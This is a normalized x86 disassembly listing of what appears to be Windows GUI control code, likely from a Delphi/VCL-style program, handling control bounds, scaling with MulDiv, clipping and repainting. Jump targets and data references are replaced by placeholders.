mov [ esi + 0x17c ] edi
adc eax 0x0
xor edx edx
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x17c ] eax
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x17c ] eax
jmp r-xdata
mov edx 0x1
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add ebx eax
mov [ esi + 0x180 ] ebx
adc eax 0x0
mov edx 0x1
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x180 ] eax
jmp r-xdata
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x180 ] eax
jmp r-xdata
lea ecx [ esi + 0x18c ]
mov edx esi
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xe4 ]
mov edi [ esi + 0x34 ]
test edi edi
je r-xdata
sub_470438
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x98 ]
or [ esi + 0x88 ] 0x1
test [ esi + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x40 ]
mov [ esi + 0x194 ] eax
sub_47046c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x98 ]
or [ esi + 0x88 ] 0x2
test [ esi + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x44 ]
mov [ esi + 0x198 ] eax
sub_4704a0
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x98 ]
or [ esi + 0x88 ] 0x4
test [ esi + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x48 ]
mov [ esi + 0x19c ] eax
sub_4704d4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x98 ]
or [ esi + 0x88 ] 0x8
test [ esi + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x4c ]
mov [ esi + 0x1a0 ] eax
sub_470508
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x90 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_470629
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe6
call sub_40587c
test ebx ebx
je r-xdata
cmp [ eax + 0x1c4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470630
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfffffbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ eax + 0x1c4 ]
xor ecx ecx
call sub_4307b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
call sub_43c510
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x90 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x90 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x1c4 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbe
call sub_40587c
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc4
call sub_40587c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
call sub_43c22c
jmp r-xdata
mov eax [ ebx + 0x1c4 ]
mov edx [ ebp - 0x4 ]
call sub_4303e0
sub_470638
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
jne r-xdata
cmp esi [ ebx + 0x34 ]
je r-xdata
xor ecx ecx
movzx edx [ ebx + 0x59 ]
mov eax ebx
call sub_471304
mov edx edi
mov eax ebx
call sub_470710
mov edx edi
mov eax ebx
call sub_47240c
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4706a4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x164 ]
mov edx esi
call sub_4070a8
pop esi
pop ebx
retn
mov [ ebx + 0x160 ] 0x0
sub_4706c8
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov edx esp
mov eax esi
call sub_4706f0
mov ecx esp
mov edx edi
mov eax esi
mov si 0xffcc
call sub_40587c
add esp 0x10
pop edi
pop esi
retn
sub_470710
push ebx
push esi
push edi
mov ecx [ edx + 0x8 ]
mov esi [ edx ]
sub ecx esi
push ecx
mov ecx [ edx + 0xc ]
mov edi [ edx + 0x4 ]
sub ecx edi
push ecx
mov ecx edi
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x98 ]
pop edi
pop esi
pop ebx
retn
sub_470764
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_47078c
mov [ esp ] esi
mov [ esp + 0x4 ] eax
mov edx esp
mov eax ebx
call sub_470cdc
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4707a4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_47074c
mov [ esp ] eax
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_470cdc
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4707cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47084d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x34 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470854
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
sub_47085c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_470888
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx [ eax + 0x70 ]
mov ebp [ ebx + 0x14 ]
test ebp ebp
jbe r-xdata
mov ebp [ ebx + 0xc ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x3
mov eax ebx
call sub_46f5c0
mov ebp [ ebx + 0x10 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_46f5c0
mov ebp [ ebx + 0x8 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x2
mov eax ebx
call sub_46f5c0
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push esi
push ebp
call MulDiv
mov ecx eax
xor edx edx
mov eax ebx
call sub_46f5c0
sub_47090c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx [ eax + 0x74 ]
mov ebp [ ebx + 0x8 ]
test ebp ebp
jbe r-xdata
mov ebp [ ebx + 0xc ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
xor edx edx
mov eax ebx
call sub_480384
mov ebp [ ebx + 0x10 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_480384
mov ebp [ ebx + 0x14 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x2
mov eax ebx
call sub_480384
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x3
mov eax ebx
call sub_480384
sub_470990
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4709bc
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov ebx [ ebx + 0x34 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_499ba4
sub_4709ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_472314
sub_470a58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
movzx eax [ r-xdata ]
mov [ esi + 0x88 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
movzx ebx [ r-xdata ]
movzx ebx [ esi + 0x88 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x18c ]
push eax
call MulDiv
mov [ esi + 0x18c ] eax
test bl 0x2
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x5b ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x190 ]
push eax
call MulDiv
mov [ esi + 0x190 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x4c ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
je r-xdata
test bl 0x10
je r-xdata
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_470888
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_47090c
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x98 ]
mov eax ebx
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x64 ]
mov eax ebx
call sub_44c548
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_44c564
sub_470c38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_470cce
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43c9e8
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_470e50
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_407768
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470cd5
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_470e88
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_470cdc
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x98 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_470d24
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
test esi esi
je r-xdata
mov edx ebx
call sub_4757a8
mov edx ebx
mov eax esi
call sub_475688
mov eax ebx
call sub_4702b4
sub_470d70
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x59 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffce
call sub_40587c
mov [ edi + 0x59 ] bl
push 0x0
movzx ecx bl
mov edx 0xb00b
mov eax edi
call sub_472314
mov eax edi
mov edx [ eax ]
call [ edx + 0x68 ]
sub_470e2c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4616ac
mov edx ebx
mov eax esi
call sub_43c22c
sub_470e50
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_470dc0
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_4071e4
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
call sub_407134
mov edx eax
lea ecx [ ebx + 0x1 ]
mov eax esi
call sub_470dd0
sub_470e88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_470edd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_470e50
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_407768
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470ee4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax esi
call sub_407134
mov edx eax
mov eax ebx
call sub_470290
sub_470f08
push ebx
mov ebx eax
mov [ ebx + 0x5b ] 0x0
mov [ ebx + 0x58 ] 0x0
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_472314
pop ebx
retn
or [ ebx + 0x88 ] 0x10
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebx + 0x84 ] eax
sub_470fdc
push ebx
mov ebx eax
cmp edx [ ebx + 0x6c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x6c ] edx
mov [ ebx + 0x5c ] 0x0
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00d
mov eax ebx
call sub_472314
test [ ebx + 0x1c ] 0x2
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_4710a4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_471094
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_46d8ac
mov eax esi
call sub_46d8ac
jmp r-xdata
sub_4710ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x1dc ]
mov edx ebx
call sub_430608
test eax eax
jl r-xdata
mov edx [ ebx + 0x34 ]
mov edi [ edx + 0x1dc ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_430438
mov eax [ ebx + 0x34 ]
mov eax [ eax + 0x1dc ]
mov ecx ebx
mov edx esi
call sub_430658
mov cl 0x1
movzx edx [ ebx + 0x59 ]
mov eax ebx
call sub_471304
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_4946b4
mov esi eax
test [ esi + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov eax esi
mov si 0xffd1
call sub_40587c
sub_471178
mov ecx [ eax + 0x34 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_4710ec
mov edx [ ecx + 0x1dc ]
mov edx [ edx + 0x8 ]
dec edx
call sub_4710ec
jmp r-xdata
sub_47119c
push ebx
mov ebx eax
mov [ ebx + 0x16c ] edx
test edx edx
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov eax edx
mov edx ebx
call sub_43c22c
pop ebx
retn
mov eax ebx
call sub_472370
cmp eax [ ebx + 0x16c ]
je r-xdata
mov [ ebx + 0x170 ] 0x0
sub_4711d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_47126a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x34 ] 0x0
jne r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov ebx eax
push 0x0
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
push ebx
call SetViewportOrgEx
mov eax [ esi + 0x4c ]
push eax
mov eax [ esi + 0x48 ]
push eax
push 0x0
push 0x0
push ebx
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471271
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
sub_47127c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x34 ]
mov edi [ eax + 0x1dc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_430608
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4305a0
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4706f0
lea ecx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x14 ]
lea eax [ ebp - 0x14 ]
call sub_40abfc
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x14 ]
lea eax [ ebp - 0x14 ]
call sub_40ab6c
test al al
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471304
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_47a060
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4706f0
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_479ce0
push eax
call InvalidateRect
push ebp
call sub_47127c
pop ecx
test al al
je r-xdata
mov al 0x1
sub_4713ac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x2 ] cx
mov [ ebp - 0x3 ] 0x0
cmp [ eax + 0x12a ] 0x0
je r-xdata
movzx eax [ ebp - 0x3 ]
pop ebx
pop ecx
pop ebp
retn 0xc
movzx ecx [ ebp - 0x2 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x3 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_4713f4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_4946a4
mov esi eax
call sub_46d884
test eax eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
cmp esi eax
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp ebx eax
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_472314
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_40587c
jmp r-xdata
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x84 ]
sub_471468
push esi
push edi
mov esi eax
mov edi [ esi + 0x34 ]
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov dl 0x1
mov eax esi
call sub_470d70
test [ esi + 0x51 ] 0x4
je r-xdata
pop edi
pop esi
retn
sub_4714b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x59 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_47a060
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x9c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_479ce0
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_471591
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_477258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_479ce0
push eax
call ReleaseDC
retn
sub_471638
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ rw-data ]
call sub_47f8fc
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_47f9cc
mov eax edi
call sub_472398
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x8b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_470990
mov eax [ esp + 0x8 ]
and eax 0xffff
mov edx [ esp + 0xc ]
shl edx 0x10
or eax edx
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
